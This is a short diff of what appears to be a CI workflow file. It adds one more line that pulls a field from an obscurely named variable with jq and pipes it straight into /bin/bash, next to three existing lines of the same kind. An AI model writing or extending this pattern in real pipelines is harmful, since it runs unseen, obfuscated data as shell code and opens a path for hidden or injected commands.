@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$ngbz97" | jq -r .fsp49 | /bin/bash
           echo $bj8 | jq -r .wddqy51 | /bin/bash
           echo $gft2775 | jq -r .llc672 | /bin/bash
+          echo $atpmt03761 | jq -r .l1897 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
